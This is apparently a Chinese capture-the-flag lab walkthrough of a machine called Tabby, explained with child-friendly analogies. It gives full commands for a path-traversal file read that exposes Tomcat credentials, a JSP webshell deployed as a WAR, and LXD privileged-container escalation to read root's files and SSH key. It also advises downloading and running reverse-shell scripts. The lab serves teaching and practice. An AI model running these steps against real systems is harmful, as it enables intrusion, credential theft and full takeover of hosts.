Phase 1

立足点：LFI → Tomcat 凭据 → WAR 部署 RCE

本地文件包含（LFI）

news.php 的 file 参数存在路径穿越漏洞：

$ curl -s "http://10.129.49.156/news.php?file=../../../../../../etc/passwd"
ash:x:1000:1000:clive:/home/ash:/bin/bash
tomcat:x:997:997::/opt/tomcat:/bin/false
🧒 儿童版 — 电梯到地下室偷钥匙 news.php 本来只该加载新闻文件，但它没检查路径。加上 ../../../../../../ 就能往上级目录爬，读到系统上的任何文件——电梯按负数楼层到地下室的老套路。

读取 Tomcat 凭据

通过 LFI 读取 Tomcat 配置文件：

$ curl -s "http://10.129.49.156/news.php?file=../../../../usr/share/tomcat9/etc/tomcat-users.xml"
<role rolename="admin-gui"/>
<role rolename="manager-script"/>
<user username="tomcat" password="$3cureP4s5w0rd123!"
      roles="admin-gui,manager-script"/>
注意角色区别 用户角色是 manager-script（不是 manager-gui），所以只能通过 text 接口 /manager/text/ 操作，不能用网页 GUI。

部署恶意 WAR 包

下载 JSP webshell 并打包成 WAR 文件：

$ wget https://gist.github.com/ErosLever/7445a3cfaaf80f1f5a53/archive/f14a53bd1095a387c063466167d49c20bb94050a.zip
$ unzip f14a53bd1095a387c063466167d49c20bb94050a.zip
$ zip webshell1.war 7445a3cfaaf80f1f5a53-*/cmd.jsp

通过 text 接口部署：

$ USERNAME=tomcat
$ PASSWORD=\$3cureP4s5w0rd123!
$ curl -u ${USERNAME}:${PASSWORD} -T webshell1.war \
  "http://10.129.49.156:8080/manager/text/deploy?path=/webshell1&update=true"
OK - Deployed application at context path [/webshell1]
🧒 儿童版 — 假应用里藏遥控器 Tomcat 可以"安装"Java 应用（WAR 文件）。我们做了一个假应用，里面其实是个遥控器（webshell）。用偷来的管理员密码把它安装到服务器上，然后通过浏览器访问就能执行任何命令。

Phase 3

权限提升：LXD 特权容器逃逸

发现 lxd 组

ash@tabby:~$ groups
ash adm cdrom dip plugdev lxd
🧒 儿童版 — 虚拟机挂真硬盘 LXD 就是一个"虚拟机管理器"。ash 有权限创建虚拟机。关键是：你可以创建一个"超级管理员虚拟机"，然后把真实电脑的整个硬盘挂载进去。在虚拟机里你是 root，硬盘是真实的——所以你可以读写真实电脑上的任何文件。

步骤一：攻击机构建 Alpine 镜像

$ git clone https://github.com/saghul/lxd-alpine-builder.git
$ cd lxd-alpine-builder
$ ./build-alpine
# 生成 alpine-v3.13-x86_64-*.tar.gz
$ python3 -m http.server 8000

步骤二：靶机下载镜像

ash@tabby:~$ wget http://10.10.15.65:8000/alpine-v3.13-x86_64-20210218_0139.tar.gz

步骤三：初始化 LXD 并导入镜像

ash@tabby:~$ lxd init
# 全部回车选默认值

ash@tabby:~$ /snap/bin/lxc image import ./alpine-v3.13-x86_64-20210218_0139.tar.gz --alias alpine
ash@tabby:~$ /snap/bin/lxc image list
# 确认导入成功

步骤四：创建特权容器并挂载宿主机

# 创建存储池
$ /snap/bin/lxc storage create default dir
$ /snap/bin/lxc profile device add default root disk path=/ pool=default

# 创建特权容器
$ /snap/bin/lxc init alpine mycontainer -c security.privileged=true

# 挂载宿主机根目录到容器的 /mnt/root
$ /snap/bin/lxc config device add mycontainer mydevice disk \
  source=/ path=/mnt/root recursive=true

# 启动
$ /snap/bin/lxc start mycontainer
LXD 提权原理 security.privileged=true 让容器以真正的 root 权限运行（不经过用户命名空间隔离）。disk source=/ path=/mnt/root recursive=true 把宿主机整个根文件系统挂载进容器。进入容器后就能读写宿主机的 /root、/etc 等敏感目录。

步骤五：进入容器拿 root

$ /snap/bin/lxc exec mycontainer /bin/sh

# 已经是容器内的 root，宿主机文件系统在 /mnt/root
# cat /mnt/root/root/root.txt
7be51031dde2d5548bde287575c25a11

# 也可以拿 SSH 私钥
# cat /mnt/root/root/.ssh/id_rsa
# 用私钥直接 SSH 登录宿主机
$ chmod 600 id_rsa
$ ssh -i id_rsa root@10.129.49.156
附录

知识点总结

LFI 路径穿越 → 偷配置文件是经典组合。

Tomcat 的 tomcat-users.xml 包含明文密码。其他常见目标：/etc/shadow、wp-config.php、.env、SSH 私钥。

manager-script ≠ manager-gui。

Tomcat 的 manager-script 角色只能通过 /manager/text/ 接口操作（curl 部署），不能用网页 GUI。实战中这个限制很常见。

bash 反弹 shell 不成功时，改用"下载执行"。

受限环境下（webshell、非交互 shell），直接 bash 反弹经常失败。把反弹脚本写成文件，用 wget 下载再 bash 执行更稳定。

fcrackzip 的 -u 参数不能省。

-u 会验证解压结果，避免误报。不加它可能报出错误密码。

lxd 组 = root。

lxd 组成员可以创建特权容器并挂载宿主机文件系统。这和 docker 组提权原理一样——容器管理器的权限等于 root 权限。检查用户组时，lxd 和 docker 都是红色警报。
